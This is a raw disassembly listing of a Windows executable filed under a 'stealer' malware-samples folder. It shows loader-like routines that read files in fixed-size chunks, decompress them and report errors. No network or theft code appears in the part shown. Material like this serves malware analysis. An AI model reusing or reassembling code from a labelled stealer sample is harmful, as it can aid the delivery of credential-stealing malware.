
malware_samples/stealer/5a616be3a292055d1bfb135bf6ad6ff9be4cd4e8019f819bead20937e2dd96b4.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	e8 7f ee 00 00       	call   0x14000fe88
   140001009:	8b 08                	mov    (%rax),%ecx
   14000100b:	48 8b 05 ee cf 03 00 	mov    0x3cfee(%rip),%rax        # 0x14003e000
   140001012:	89 08                	mov    %ecx,(%rax)
   140001014:	e8 77 ee 00 00       	call   0x14000fe90
   140001019:	48 8b 08             	mov    (%rax),%rcx
   14000101c:	48 8b 05 dd cf 03 00 	mov    0x3cfdd(%rip),%rax        # 0x14003e000
   140001023:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140001027:	48 8b 0d d2 cf 03 00 	mov    0x3cfd2(%rip),%rcx        # 0x14003e000
   14000102e:	48 83 c4 28          	add    $0x28,%rsp
   140001032:	e9 89 27 00 00       	jmp    0x1400037c0
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 8d 05 91 23 04 00 	lea    0x42391(%rip),%rax        # 0x1400433d8
   140001047:	c3                   	ret
   140001048:	cc                   	int3
   140001049:	cc                   	int3
   14000104a:	cc                   	int3
   14000104b:	cc                   	int3
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001055:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000105a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000105f:	57                   	push   %rdi
   140001060:	41 54                	push   %r12
   140001062:	41 55                	push   %r13
   140001064:	41 56                	push   %r14
   140001066:	41 57                	push   %r15
   140001068:	48 83 ec 30          	sub    $0x30,%rsp
   14000106c:	4c 8b f2             	mov    %rdx,%r14
   14000106f:	33 f6                	xor    %esi,%esi
   140001071:	48 8d 15 4c a8 02 00 	lea    0x2a84c(%rip),%rdx        # 0x14002b8c4
   140001078:	44 8b fe             	mov    %esi,%r15d
   14000107b:	49 8b f8             	mov    %r8,%rdi
   14000107e:	48 8b d9             	mov    %rcx,%rbx
   140001081:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   140001087:	e8 24 35 00 00       	call   0x1400045b0
   14000108c:	4c 8b e0             	mov    %rax,%r12
   14000108f:	48 85 c0             	test   %rax,%rax
   140001092:	75 15                	jne    0x1400010a9
   140001094:	49 8d 56 12          	lea    0x12(%r14),%rdx
   140001098:	48 8d 0d 29 a8 02 00 	lea    0x2a829(%rip),%rcx        # 0x14002b8c8
   14000109f:	e8 6c 16 00 00       	call   0x140002710
   1400010a4:	e9 21 01 00 00       	jmp    0x1400011ca
   1400010a9:	41 8b 56 04          	mov    0x4(%r14),%edx
   1400010ad:	45 33 c0             	xor    %r8d,%r8d
   1400010b0:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400010b7:	49 8b cc             	mov    %r12,%rcx
   1400010ba:	e8 85 f6 00 00       	call   0x140010744
   1400010bf:	85 c0                	test   %eax,%eax
   1400010c1:	79 23                	jns    0x1400010e6
   1400010c3:	e8 b0 3e 01 00       	call   0x140014f78
   1400010c8:	4d 8d 4e 12          	lea    0x12(%r14),%r9
   1400010cc:	4c 8d 05 2d a8 02 00 	lea    0x2a82d(%rip),%r8        # 0x14002b900
   1400010d3:	48 8d 0d 62 a8 02 00 	lea    0x2a862(%rip),%rcx        # 0x14002b93c
   1400010da:	8b 10                	mov    (%rax),%edx
   1400010dc:	e8 2f 18 00 00       	call   0x140002910
   1400010e1:	e9 c6 00 00 00       	jmp    0x1400011ac
   1400010e6:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   1400010ea:	e8 c5 3e 01 00       	call   0x140014fb4
   1400010ef:	4c 8b f8             	mov    %rax,%r15
   1400010f2:	48 85 c0             	test   %rax,%rax
   1400010f5:	75 2b                	jne    0x140001122
   1400010f7:	41 8b 5e 0c          	mov    0xc(%r14),%ebx
   1400010fb:	e8 78 3e 01 00       	call   0x140014f78
   140001100:	4d 8d 4e 12          	lea    0x12(%r14),%r9
   140001104:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001108:	4c 8d 05 41 a8 02 00 	lea    0x2a841(%rip),%r8        # 0x14002b950
   14000110f:	48 8d 0d 4e a6 02 00 	lea    0x2a64e(%rip),%rcx        # 0x14002b764
   140001116:	8b 10                	mov    (%rax),%edx
   140001118:	e8 f3 17 00 00       	call   0x140002910
   14000111d:	e9 8a 00 00 00       	jmp    0x1400011ac
   140001122:	41 80 7e 10 01       	cmpb   $0x1,0x10(%r14)
   140001127:	75 13                	jne    0x14000113c
   140001129:	4d 8b cf             	mov    %r15,%r9
   14000112c:	45 33 c0             	xor    %r8d,%r8d
   14000112f:	49 8b d6             	mov    %r14,%rdx
   140001132:	49 8b cc             	mov    %r12,%rcx
   140001135:	e8 d6 00 00 00       	call   0x140001210
   14000113a:	eb 61                	jmp    0x14000119d
   14000113c:	41 8b 5e 0c          	mov    0xc(%r14),%ebx
   140001140:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140001145:	49 8b ef             	mov    %r15,%rbp
   140001148:	48 85 db             	test   %rbx,%rbx
   14000114b:	74 44                	je     0x140001191
   14000114d:	b8 00 20 00 00       	mov    $0x2000,%eax
   140001152:	0f 1f 40 00          	nopl   0x0(%rax)
   140001156:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000115d:	00 00 00 
   140001160:	48 3b d8             	cmp    %rax,%rbx
   140001163:	48 8b fb             	mov    %rbx,%rdi
   140001166:	4d 8b cc             	mov    %r12,%r9
   140001169:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000116f:	48 0f 47 f8          	cmova  %rax,%rdi
   140001173:	48 8b cd             	mov    %rbp,%rcx
   140001176:	48 8b d7             	mov    %rdi,%rdx
   140001179:	e8 8e f2 00 00       	call   0x14001040c
   14000117e:	48 83 f8 01          	cmp    $0x1,%rax
   140001182:	72 69                	jb     0x1400011ed
   140001184:	48 03 ef             	add    %rdi,%rbp
   140001187:	b8 00 20 00 00       	mov    $0x2000,%eax
   14000118c:	48 2b df             	sub    %rdi,%rbx
   14000118f:	75 cf                	jne    0x140001160
   140001191:	8b c6                	mov    %esi,%eax
   140001193:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140001198:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   14000119d:	85 c0                	test   %eax,%eax
   14000119f:	74 0b                	je     0x1400011ac
   1400011a1:	49 8b cf             	mov    %r15,%rcx
   1400011a4:	e8 f7 3d 01 00       	call   0x140014fa0
   1400011a9:	4c 8b fe             	mov    %rsi,%r15
   1400011ac:	49 8b cc             	mov    %r12,%rcx
   1400011af:	e8 08 ef 00 00       	call   0x1400100bc
   1400011b4:	49 8b f7             	mov    %r15,%rsi
   1400011b7:	4d 85 ff             	test   %r15,%r15
   1400011ba:	74 0e                	je     0x1400011ca
   1400011bc:	48 8b d7             	mov    %rdi,%rdx
   1400011bf:	49 8b cf             	mov    %r15,%rcx
   1400011c2:	e8 19 35 00 00       	call   0x1400046e0
   1400011c7:	44 8b e8             	mov    %eax,%r13d
   1400011ca:	48 8b ce             	mov    %rsi,%rcx
   1400011cd:	e8 ce 3d 01 00       	call   0x140014fa0
   1400011d2:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400011d7:	41 8b c5             	mov    %r13d,%eax
   1400011da:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400011df:	48 83 c4 30          	add    $0x30,%rsp
   1400011e3:	41 5f                	pop    %r15
   1400011e5:	41 5e                	pop    %r14
   1400011e7:	41 5d                	pop    %r13
   1400011e9:	41 5c                	pop    %r12
   1400011eb:	5f                   	pop    %rdi
   1400011ec:	c3                   	ret
   1400011ed:	e8 86 3d 01 00       	call   0x140014f78
   1400011f2:	4d 8d 4e 12          	lea    0x12(%r14),%r9
   1400011f6:	4c 8d 05 4b a6 02 00 	lea    0x2a64b(%rip),%r8        # 0x14002b848
   1400011fd:	48 8d 0d 78 a6 02 00 	lea    0x2a678(%rip),%rcx        # 0x14002b87c
   140001204:	8b 10                	mov    (%rax),%edx
   140001206:	e8 05 17 00 00       	call   0x140002910
   14000120b:	41 8b c5             	mov    %r13d,%eax
   14000120e:	eb 83                	jmp    0x140001193
   140001210:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001215:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000121a:	53                   	push   %rbx
   14000121b:	55                   	push   %rbp
   14000121c:	56                   	push   %rsi
   14000121d:	57                   	push   %rdi
   14000121e:	41 56                	push   %r14
   140001220:	41 57                	push   %r15
   140001222:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001229:	33 c0                	xor    %eax,%eax
   14000122b:	4d 8b f0             	mov    %r8,%r14
   14000122e:	48 8b da             	mov    %rdx,%rbx
   140001231:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001236:	48 8b f9             	mov    %rcx,%rdi
   140001239:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000123e:	41 b8 58 00 00 00    	mov    $0x58,%r8d
   140001244:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001249:	48 8d 15 70 a4 02 00 	lea    0x2a470(%rip),%rdx        # 0x14002b6c0
   140001250:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001254:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001259:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000125e:	8b e8                	mov    %eax,%ebp
   140001260:	49 8b f1             	mov    %r9,%rsi
   140001263:	e8 88 ab 00 00       	call   0x14000bdf0
   140001268:	44 8b f8             	mov    %eax,%r15d
   14000126b:	85 c0                	test   %eax,%eax
   14000126d:	74 28                	je     0x140001297
   14000126f:	48 8d 53 12          	lea    0x12(%rbx),%rdx
   140001273:	44 8b c0             	mov    %eax,%r8d
   140001276:	48 8d 0d 53 a4 02 00 	lea    0x2a453(%rip),%rcx        # 0x14002b6d0
   14000127d:	e8 8e 14 00 00       	call   0x140002710
   140001282:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001287:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   14000128e:	41 5f                	pop    %r15
   140001290:	41 5e                	pop    %r14
   140001292:	5f                   	pop    %rdi
   140001293:	5e                   	pop    %rsi
   140001294:	5d                   	pop    %rbp
   140001295:	5b                   	pop    %rbx
   140001296:	c3                   	ret
   140001297:	b9 00 20 00 00       	mov    $0x2000,%ecx
   14000129c:	4c 89 ac 24 80 00 00 	mov    %r13,0x80(%rsp)
   1400012a3:	00 
   1400012a4:	e8 0b 3d 01 00       	call   0x140014fb4
   1400012a9:	4c 8b e8             	mov    %rax,%r13
   1400012ac:	48 85 c0             	test   %rax,%rax
   1400012af:	75 23                	jne    0x1400012d4
   1400012b1:	e8 c2 3c 01 00       	call   0x140014f78
   1400012b6:	4c 8d 4b 12          	lea    0x12(%rbx),%r9
   1400012ba:	4c 8d 05 5f a4 02 00 	lea    0x2a45f(%rip),%r8        # 0x14002b720
   1400012c1:	48 8d 0d 9c a4 02 00 	lea    0x2a49c(%rip),%rcx        # 0x14002b764
   1400012c8:	8b 10                	mov    (%rax),%edx
   1400012ca:	e8 41 16 00 00       	call   0x140002910
   1400012cf:	e9 65 01 00 00       	jmp    0x140001439
   1400012d4:	b9 00 20 00 00       	mov    $0x2000,%ecx
   1400012d9:	e8 d6 3c 01 00       	call   0x140014fb4
   1400012de:	48 8b e8             	mov    %rax,%rbp
   1400012e1:	48 85 c0             	test   %rax,%rax
   1400012e4:	75 23                	jne    0x140001309
   1400012e6:	e8 8d 3c 01 00       	call   0x140014f78
   1400012eb:	4c 8d 4b 12          	lea    0x12(%rbx),%r9
   1400012ef:	4c 8d 05 7a a4 02 00 	lea    0x2a47a(%rip),%r8        # 0x14002b770
   1400012f6:	48 8d 0d 67 a4 02 00 	lea    0x2a467(%rip),%rcx        # 0x14002b764
   1400012fd:	8b 10                	mov    (%rax),%edx
   1400012ff:	e8 0c 16 00 00       	call   0x140002910
   140001304:	e9 30 01 00 00       	jmp    0x140001439
   140001309:	4c 89 a4 24 d0 00 00 	mov    %r12,0xd0(%rsp)
   140001310:	00 
   140001311:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001317:	44 8b 63 08          	mov    0x8(%rbx),%r12d
   14000131b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001320:	b8 00 20 00 00       	mov    $0x2000,%eax
   140001325:	49 8b dc             	mov    %r12,%rbx
   140001328:	4c 3b e0             	cmp    %rax,%r12
   14000132b:	4c 8b cf             	mov    %rdi,%r9
   14000132e:	ba 01 00 00 00       	mov    $0x1,%edx
   140001333:	49 8b cd             	mov    %r13,%rcx
   140001336:	48 0f 47 d8          	cmova  %rax,%rbx
   14000133a:	4c 8b c3             	mov    %rbx,%r8
   14000133d:	e8 ca f0 00 00       	call   0x14001040c
   140001342:	48 3b c3             	cmp    %rbx,%rax
   140001345:	0f 85 e6 00 00 00    	jne    0x140001431
   14000134b:	48 8b cf             	mov    %rdi,%rcx
   14000134e:	e8 2d ee 00 00       	call   0x140010180
   140001353:	85 c0                	test   %eax,%eax
   140001355:	0f 85 d6 00 00 00    	jne    0x140001431
   14000135b:	4c 2b e3             	sub    %rbx,%r12
   14000135e:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001362:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140001367:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000136e:	00 00 
   140001370:	bb 00 20 00 00       	mov    $0x2000,%ebx
   140001375:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   14000137a:	33 d2                	xor    %edx,%edx
   14000137c:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140001380:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001385:	e8 a6 8e 00 00       	call   0x14000a230
   14000138a:	8b f8                	mov    %eax,%edi
   14000138c:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001392:	8d 48 04             	lea    0x4(%rax),%ecx
   140001395:	83 f9 02             	cmp    $0x2,%ecx
   140001398:	76 7c                	jbe    0x140001416
   14000139a:	83 f8 02             	cmp    $0x2,%eax
   14000139d:	74 72                	je     0x140001411
   14000139f:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   1400013a3:	48 2b d9             	sub    %rcx,%rbx
   1400013a6:	4d 85 f6             	test   %r14,%r14
   1400013a9:	74 29                	je     0x1400013d4
   1400013ab:	4d 8b ce             	mov    %r14,%r9
   1400013ae:	4c 8b c3             	mov    %rbx,%r8
   1400013b1:	ba 01 00 00 00       	mov    $0x1,%edx
   1400013b6:	48 8b cd             	mov    %rbp,%rcx
   1400013b9:	e8 8e f7 00 00       	call   0x140010b4c
   1400013be:	48 3b c3             	cmp    %rbx,%rax
   1400013c1:	75 0c                	jne    0x1400013cf
   1400013c3:	49 8b ce             	mov    %r14,%rcx
   1400013c6:	e8 b5 ed 00 00       	call   0x140010180
   1400013cb:	85 c0                	test   %eax,%eax
   1400013cd:	74 1b                	je     0x1400013ea
   1400013cf:	41 8b ff             	mov    %r15d,%edi
   1400013d2:	eb 42                	jmp    0x140001416
   1400013d4:	48 85 f6             	test   %rsi,%rsi
   1400013d7:	74 11                	je     0x1400013ea
   1400013d9:	4c 8b c3             	mov    %rbx,%r8
   1400013dc:	48 8b d5             	mov    %rbp,%rdx
   1400013df:	48 8b ce             	mov    %rsi,%rcx
   1400013e2:	e8 b9 8a 02 00       	call   0x140029ea0
   1400013e7:	48 03 f3             	add    %rbx,%rsi
   1400013ea:	83 7c 24 38 00       	cmpl   $0x0,0x38(%rsp)
   1400013ef:	0f 84 7b ff ff ff    	je     0x140001370
   1400013f5:	83 ff 01             	cmp    $0x1,%edi
   1400013f8:	74 12                	je     0x14000140c
   1400013fa:	4d 85 e4             	test   %r12,%r12
   1400013fd:	74 17                	je     0x140001416
   1400013ff:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140001406:	00 
   140001407:	e9 14 ff ff ff       	jmp    0x140001320
   14000140c:	45 33 ff             	xor    %r15d,%r15d
   14000140f:	eb 20                	jmp    0x140001431
   140001411:	bf fd ff ff ff       	mov    $0xfffffffd,%edi
   140001416:	48 8b 94 24 c8 00 00 	mov    0xc8(%rsp),%rdx
   14000141d:	00 
   14000141e:	48 8d 0d 9b a3 02 00 	lea    0x2a39b(%rip),%rcx        # 0x14002b7c0
   140001425:	48 83 c2 12          	add    $0x12,%rdx
   140001429:	44 8b c7             	mov    %edi,%r8d
   14000142c:	e8 df 12 00 00       	call   0x140002710
   140001431:	4c 8b a4 24 d0 00 00 	mov    0xd0(%rsp),%r12
   140001438:	00 
   140001439:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000143e:	e8 8d a6 00 00       	call   0x14000bad0
   140001443:	49 8b cd             	mov    %r13,%rcx
   140001446:	e8 55 3b 01 00       	call   0x140014fa0
   14000144b:	48 8b cd             	mov    %rbp,%rcx
   14000144e:	e8 4d 3b 01 00       	call   0x140014fa0
   140001453:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
   14000145a:	00 
   14000145b:	41 8b c7             	mov    %r15d,%eax
   14000145e:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001465:	41 5f                	pop    %r15
   140001467:	41 5e                	pop    %r14
   140001469:	5f                   	pop    %rdi
   14000146a:	5e                   	pop    %rsi
   14000146b:	5d                   	pop    %rbp
   14000146c:	5b                   	pop    %rbx
   14000146d:	c3                   	ret
   14000146e:	cc                   	int3
   14000146f:	cc                   	int3
   140001470:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001475:	55                   	push   %rbp
   140001476:	41 56                	push   %r14
   140001478:	41 57                	push   %r15
   14000147a:	48 83 ec 30          	sub    $0x30,%rsp
   14000147e:	48 8b ea             	mov    %rdx,%rbp
   140001481:	48 8b d9             	mov    %rcx,%rbx
   140001484:	48 8d 15 39 a4 02 00 	lea    0x2a439(%rip),%rdx        # 0x14002b8c4
   14000148b:	45 33 f6             	xor    %r14d,%r14d
   14000148e:	e8 1d 31 00 00       	call   0x1400045b0
   140001493:	4c 8b f8             	mov    %rax,%r15
   140001496:	48 85 c0             	test   %rax,%rax
   140001499:	75 21                	jne    0x1400014bc
   14000149b:	48 8d 55 12          	lea    0x12(%rbp),%rdx
   14000149f:	48 8d 0d 22 a4 02 00 	lea    0x2a422(%rip),%rcx        # 0x14002b8c8
   1400014a6:	e8 65 12 00 00       	call   0x140002710
   1400014ab:	33 c0                	xor    %eax,%eax
   1400014ad:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400014b2:	48 83 c4 30          	add    $0x30,%rsp
   1400014b6:	41 5f                	pop    %r15
   1400014b8:	41 5e                	pop    %r14
   1400014ba:	5d                   	pop    %rbp
   1400014bb:	c3                   	ret
   1400014bc:	8b 55 04             	mov    0x4(%rbp),%edx
   1400014bf:	45 33 c0             	xor    %r8d,%r8d
   1400014c2:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400014c9:	49 8b cf             	mov    %r15,%rcx
   1400014cc:	e8 73 f2 00 00       	call   0x140010744
   1400014d1:	85 c0                	test   %eax,%eax
   1400014d3:	79 23                	jns    0x1400014f8
   1400014d5:	e8 9e 3a 01 00       	call   0x140014f78
   1400014da:	4c 8d 4d 12          	lea    0x12(%rbp),%r9
   1400014de:	4c 8d 05 1b a4 02 00 	lea    0x2a41b(%rip),%r8        # 0x14002b900
   1400014e5:	48 8d 0d 50 a4 02 00 	lea    0x2a450(%rip),%rcx        # 0x14002b93c
   1400014ec:	8b 10                	mov    (%rax),%edx
   1400014ee:	e8 1d 14 00 00       	call   0x140002910
   1400014f3:	e9 c4 00 00 00       	jmp    0x1400015bc
   1400014f8:	8b 4d 0c             	mov    0xc(%rbp),%ecx
   1400014fb:	e8 b4 3a 01 00       	call   0x140014fb4
   140001500:	4c 8b f0             	mov    %rax,%r14
   140001503:	48 85 c0             	test   %rax,%rax
   140001506:	75 2a                	jne    0x140001532
   140001508:	8b 5d 0c             	mov    0xc(%rbp),%ebx
   14000150b:	e8 68 3a 01 00       	call   0x140014f78
   140001510:	4c 8d 4d 12          	lea    0x12(%rbp),%r9
   140001514:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001518:	4c 8d 05 31 a4 02 00 	lea    0x2a431(%rip),%r8        # 0x14002b950
   14000151f:	48 8d 0d 3e a2 02 00 	lea    0x2a23e(%rip),%rcx        # 0x14002b764
   140001526:	8b 10                	mov    (%rax),%edx
   140001528:	e8 e3 13 00 00       	call   0x140002910
   14000152d:	e9 8a 00 00 00       	jmp    0x1400015bc
   140001532:	80 7d 10 01          	cmpb   $0x1,0x10(%rbp)
   140001536:	75 13                	jne    0x14000154b
   140001538:	4d 8b ce             	mov    %r14,%r9
   14000153b:	45 33 c0             	xor    %r8d,%r8d
   14000153e:	48 8b d5             	mov    %rbp,%rdx
   140001541:	49 8b cf             	mov    %r15,%rcx
   140001544:	e8 c7 fc ff ff       	call   0x140001210
   140001549:	eb 62                	jmp    0x1400015ad
   14000154b:	8b 5d 0c             	mov    0xc(%rbp),%ebx
   14000154e:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140001553:	49 8b f6             	mov    %r14,%rsi
   140001556:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   14000155b:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140001560:	48 85 db             	test   %rbx,%rbx
   140001563:	74 37                	je     0x14000159c
   140001565:	41 bc 00 20 00 00    	mov    $0x2000,%r12d
   14000156b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001570:	49 3b dc             	cmp    %r12,%rbx
   140001573:	48 8b fb             	mov    %rbx,%rdi
   140001576:	4d 8b cf             	mov    %r15,%r9
   140001579:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000157f:	49 0f 47 fc          	cmova  %r12,%rdi
   140001583:	48 8b ce             	mov    %rsi,%rcx
   140001586:	48 8b d7             	mov    %rdi,%rdx
   140001589:	e8 7e ee 00 00       	call   0x14001040c
   14000158e:	48 83 f8 01          	cmp    $0x1,%rax
   140001592:	72 42                	jb     0x1400015d6
   140001594:	48 03 f7             	add    %rdi,%rsi
   140001597:	48 2b df             	sub    %rdi,%rbx
   14000159a:	75 d4                	jne    0x140001570
   14000159c:	33 c0                	xor    %eax,%eax
   14000159e:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400015a3:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400015a8:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   1400015ad:	85 c0                	test   %eax,%eax
   1400015af:	74 0b                	je     0x1400015bc
   1400015b1:	49 8b ce             	mov    %r14,%rcx
   1400015b4:	e8 e7 39 01 00       	call   0x140014fa0
   1400015b9:	45 33 f6             	xor    %r14d,%r14d
   1400015bc:	49 8b cf             	mov    %r15,%rcx
   1400015bf:	e8 f8 ea 00 00       	call   0x1400100bc
   1400015c4:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400015c9:	49 8b c6             	mov    %r14,%rax
   1400015cc:	48 83 c4 30          	add    $0x30,%rsp
   1400015d0:	41 5f                	pop    %r15
   1400015d2:	41 5e                	pop    %r14
   1400015d4:	5d                   	pop    %rbp
   1400015d5:	c3                   	ret
   1400015d6:	e8 9d 39 01 00       	call   0x140014f78
   1400015db:	4c 8d 4d 12          	lea    0x12(%rbp),%r9
   1400015df:	4c 8d 05 62 a2 02 00 	lea    0x2a262(%rip),%r8        # 0x14002b848
   1400015e6:	48 8d 0d 8f a2 02 00 	lea    0x2a28f(%rip),%rcx        # 0x14002b87c
   1400015ed:	8b 10                	mov    (%rax),%edx
   1400015ef:	e8 1c 13 00 00       	call   0x140002910
   1400015f4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400015f9:	eb a3                	jmp    0x14000159e
   1400015fb:	cc                   	int3
   1400015fc:	cc                   	int3
   1400015fd:	cc                   	int3
   1400015fe:	cc                   	int3
   1400015ff:	cc                   	int3
   140001600:	40 53                	rex push %rbx
   140001602:	57                   	push   %rdi
   140001603:	48 83 ec 38          	sub    $0x38,%rsp
   140001607:	80 7a 11 6e          	cmpb   $0x6e,0x11(%rdx)
   14000160b:	48 8b fa             	mov    %rdx,%rdi
   14000160e:	48 8b d9             	mov    %rcx,%rbx
   140001611:	75 24                	jne    0x140001637
   140001613:	e8 38 fa ff ff       	call   0x140001050
   140001618:	8b d8                	mov    %eax,%ebx
   14000161a:	85 c0                	test   %eax,%eax
   14000161c:	79 10                	jns    0x14000162e
   14000161e:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   140001622:	48 8d 0d 6f a3 02 00 	lea    0x2a36f(%rip),%rcx        # 0x14002b998
   140001629:	e8 e2 10 00 00       	call   0x140002710
   14000162e:	8b c3                	mov    %ebx,%eax
   140001630:	48 83 c4 38          	add    $0x38,%rsp
   140001634:	5f                   	pop    %rdi
   140001635:	5b                   	pop    %rbx
   140001636:	c3                   	ret
   140001637:	48 8d 15 7e a3 02 00 	lea    0x2a37e(%rip),%rdx        # 0x14002b9bc
   14000163e:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140001643:	49 8b c8             	mov    %r8,%rcx
   140001646:	e8 65 2f 00 00       	call   0x1400045b0
   14000164b:	4c 8b e0             	mov    %rax,%r12
   14000164e:	48 85 c0             	test   %rax,%rax
   140001651:	75 2f                	jne    0x140001682
   140001653:	e8 20 39 01 00       	call   0x140014f78
   140001658:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   14000165c:	4c 8d 05 5d a3 02 00 	lea    0x2a35d(%rip),%r8        # 0x14002b9c0
   140001663:	48 8d 0d 8a a3 02 00 	lea    0x2a38a(%rip),%rcx        # 0x14002b9f4
   14000166a:	8b 10                	mov    (%rax),%edx
   14000166c:	e8 9f 12 00 00       	call   0x140002910
   140001671:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140001676:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000167b:	48 83 c4 38          	add    $0x38,%rsp
   14000167f:	5f                   	pop    %rdi
   140001680:	5b                   	pop    %rbx
   140001681:	c3                   	ret
   140001682:	48 8d 15 3b a2 02 00 	lea    0x2a23b(%rip),%rdx        # 0x14002b8c4
   140001689:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000168e:	48 8b cb             	mov    %rbx,%rcx
   140001691:	e8 1a 2f 00 00       	call   0x1400045b0
   140001696:	4c 8b f8             	mov    %rax,%r15
   140001699:	48 85 c0             	test   %rax,%rax
   14000169c:	75 1a                	jne    0x1400016b8
   14000169e:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400016a2:	48 8d 0d 1f a2 02 00 	lea    0x2a21f(%rip),%rcx        # 0x14002b8c8
   1400016a9:	e8 62 10 00 00       	call   0x140002710
   1400016ae:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400016b3:	e9 69 01 00 00       	jmp    0x140001821
   1400016b8:	8b 57 04             	mov    0x4(%rdi),%edx
   1400016bb:	45 33 c0             	xor    %r8d,%r8d
   1400016be:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400016c5:	49 8b cf             	mov    %r15,%rcx
   1400016c8:	e8 77 f0 00 00       	call   0x140010744
   1400016cd:	85 c0                	test   %eax,%eax
   1400016cf:	79 28                	jns    0x1400016f9
   1400016d1:	e8 a2 38 01 00       	call   0x140014f78
   1400016d6:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   1400016da:	4c 8d 05 1f a2 02 00 	lea    0x2a21f(%rip),%r8        # 0x14002b900
   1400016e1:	48 8d 0d 54 a2 02 00 	lea    0x2a254(%rip),%rcx        # 0x14002b93c
   1400016e8:	8b 10                	mov    (%rax),%edx
   1400016ea:	e8 21 12 00 00       	call   0x140002910
   1400016ef:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400016f4:	e9 20 01 00 00       	jmp    0x140001819
   1400016f9:	80 7f 10 01          	cmpb   $0x1,0x10(%rdi)
   1400016fd:	75 18                	jne    0x140001717
   1400016ff:	45 33 c9             	xor    %r9d,%r9d
   140001702:	4d 8b c4             	mov    %r12,%r8
   140001705:	48 8b d7             	mov    %rdi,%rdx
   140001708:	49 8b cf             	mov    %r15,%rcx
   14000170b:	e8 00 fb ff ff       	call   0x140001210
   140001710:	8b d8                	mov    %eax,%ebx
   140001712:	e9 02 01 00 00       	jmp    0x140001819
   140001717:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000171c:	33 db                	xor    %ebx,%ebx
   14000171e:	41 bd 00 20 00 00    	mov    $0x2000,%r13d
   140001724:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140001729:	41 8b cd             	mov    %r13d,%ecx
   14000172c:	e8 83 38 01 00       	call   0x140014fb4
   140001731:	4c 8b f0             	mov    %rax,%r14
   140001734:	48 85 c0             	test   %rax,%rax
   140001737:	75 28                	jne    0x140001761
   140001739:	e8 3a 38 01 00       	call   0x140014f78
   14000173e:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
